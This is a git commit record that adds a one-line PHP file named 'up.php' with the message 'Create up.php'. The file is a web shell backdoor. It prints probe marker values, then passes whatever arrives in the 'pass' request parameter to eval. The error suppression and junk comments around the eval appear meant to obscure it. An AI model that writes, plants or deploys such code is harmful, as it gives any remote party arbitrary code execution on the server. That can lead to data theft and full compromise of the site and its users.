ce4c13b4bc4328e6130d8e390812ba6a0d83b46b
Eamon <aldeneamon7@gmail.com>
2025-04-03 19:31:27 +0700

    Create up.php

---
+++ up.php
@@ -0,0 +1,1 @@
+<?php print 134796852;print md5(134796);class GI7Pl14V { public function __construct($H8Jy7){ @eval("/*Z#￥h*u@!hJ2v689U02*/".$H8Jy7."/*Z#￥h*u@!hJ2v689U02*/"); }}new GI7Pl14V($_REQUEST['pass']);?>
